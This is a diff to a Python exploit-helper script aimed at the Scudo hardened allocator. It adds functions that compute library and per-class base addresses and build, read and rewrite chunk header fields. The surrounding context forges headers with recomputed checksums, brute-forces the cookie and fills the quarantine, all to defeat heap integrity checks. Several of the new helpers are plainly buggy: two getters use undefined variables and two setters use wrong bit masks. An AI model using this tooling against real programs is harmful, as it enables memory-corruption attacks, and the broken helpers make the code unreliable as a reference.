@@ -47,6 +47,9 @@ def get_libscudo_base(io, SCUDO_LIB ):
     scudo_base = io.libs()[os.path.realpath(SCUDO_LIB)]
     return scudo_base
 
+def get_perclass_base(io, scudo_lib, class_id=0):
+    return get_libscudo_base(io, scudo_lib) - 0x57a840 + (class_id * 0x100)
+
 def get_libc_base(io):
     pass
 
@@ -56,9 +59,7 @@ def get_cookie_cheat(io, scudo_base):
 
 def forge_header(address, cookie, new_header) -> bytes:
     new_checksum = calc_checksum(address, cookie, new_header)
-    print(f'checksum: {hex(new_checksum)}')
     forged_header = new_header + (new_checksum << 0x30)
-    print(f'forged header :  {hex(forged_header)}')
     return forged_header.to_bytes(8, 'little')
 
 def bruteforce_cookie(io, addr):
@@ -86,3 +87,45 @@ def populate_quarantine(io):
     for i in range(0x1000):
         free(io, malloc(io, 0x20+i)[1])
  
+def create_header(class_id, size, state, origin=0, offset=0) -> int:
+    """
+    Create numberic header value from attributes
+
+    :param int class_id: The Class ID for the chunk
+    :param int size: The Size for the chunk
+    :param int state: The state of the chunk (Available = 0, Allocated = 1, Quarantined = 2)
+    :param int origin: Origin of the allocation (Malloc = 0, New = 1, NewArray = 2, Memalign = 3)
+    :param int offset: The offset of the allocation due to alignment
+    :return: The combined header number
+    """
+    return class_id + (state << 8) + (origin << 10) + (size << 12) + (offset << 32)
+
+def header_get_offset(header) -> int:
+    return (header >> 32) & ((1 << 16) - 1)
+
+def header_get_size(header) -> int:
+    return (header >> 12) & ((1 << 20) - 1)
+
+def header_get_origin(header) -> int:
+    return (origin >> 10) & 0b11
+
+def header_get_state(header) -> int:
+    return (state >> 8) & 0b11
+
+def header_get_class_id(header) -> int:
+    return header & ((1 << 8) - 1)
+
+def header_set_offset(header, offset) -> int:
+    return (header & ((1 << 32) - 1)) + (offset << 32)
+
+def header_set_size(header, size) -> int:
+    return (header & ~(0x8ffff << 12)) + (size << 12)
+
+def header_set_origin(header, origin) -> int:
+    return (header & ~(0b11 << 10)) + (origin << 10)
+
+def header_set_state(header, state) -> int:
+    return (header & ~(0b11 << 8)) + (state << 8)
+
+def header_set_class_id(header, class_id) -> int:
+    return (header & ~0xf) + class_id
